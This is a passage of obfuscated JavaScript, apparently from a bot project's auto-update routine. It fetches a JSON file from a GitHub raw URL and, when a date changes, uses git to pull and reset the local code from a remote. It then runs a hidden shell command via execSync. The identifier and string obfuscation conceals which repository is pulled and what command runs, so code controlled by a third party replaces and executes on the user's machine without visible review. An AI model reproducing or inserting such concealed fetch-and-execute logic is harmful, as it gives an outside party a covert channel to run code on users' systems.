TMP✅','registered','FETCH_HEAD'];_0x4b37=function(){return _0x33a19f;};return _0x4b37();}async function checkForUpdate(){const _0xe2352a=_0x3c5a,_0x4c43d4=require('axios'),_0x104102=require(_0xe2352a(0x105)),_0x722ce4=require('fs'),_0x165bd8=require('path'),{execSync:_0x3fd97f}=require(_0xe2352a(0x82)),_0xbbb3c5='https://raw.githubusercontent.com/IchanZX1/ChanZX/master/public/UpdateSC.json',_0x5dfc4b=_0xe2352a(0xde),_0x5e0583=_0xe2352a(0x87);if(global[_0xe2352a(0x9a)])try{const _0x52a17c=await _0x4c43d4[_0xe2352a(0x149)](_0xbbb3c5),_0x4eb0e2=_0x52a17c[_0xe2352a(0x14c)],_0x1f3f36=_0x165bd8[_0xe2352a(0x9d)](_0x5dfc4b,_0xe2352a(0xf4));let _0x18c99f='';_0x722ce4[_0xe2352a(0xb9)](_0x1f3f36)&&(_0x18c99f=_0x722ce4[_0xe2352a(0xe4)](_0x1f3f36,_0xe2352a(0x167)));if(_0x4eb0e2['UpdateDate']!==_0x18c99f){console['log'](_0xe2352a(0x160)),_0x722ce4[_0xe2352a(0x14a)](_0x1f3f36,_0x4eb0e2['UpdateDate'],'utf8');const _0x1907a1=_0x104102(_0x5dfc4b);!_0x722ce4[_0xe2352a(0xb9)](_0x165bd8['join'](_0x5dfc4b,_0xe2352a(0xf6)))?(console['log'](_0xe2352a(0x84)),await _0x1907a1[_0xe2352a(0xf9)](),await _0x1907a1[_0xe2352a(0x14b)](_0xe2352a(0xcd),_0x5e0583),await _0x1907a1[_0xe2352a(0x122)]('origin',_0xe2352a(0x135)),await _0x1907a1[_0xe2352a(0x119)](_0xe2352a(0xd6),[_0xe2352a(0xec)])):(console['log'](_0xe2352a(0x148)),await _0x1907a1[_0xe2352a(0x122)]('origin',_0xe2352a(0x135)),await _0x1907a1[_0xe2352a(0x119)](_0xe2352a(0xd6),[_0xe2352a(0xec)])),console[_0xe2352a(0xa6)]('Update\x20selesai,\x20harap\x20jalankan\x20script\x20utama\x20kembali.'),_0x3fd97f(_0xe2352a(0xb0)),process[_0xe2352a(0x86)](0x0);}else{}}catch(_0x19f414){console['error'](_0xe2352a(0xd7),_0x19f414);}else{}}
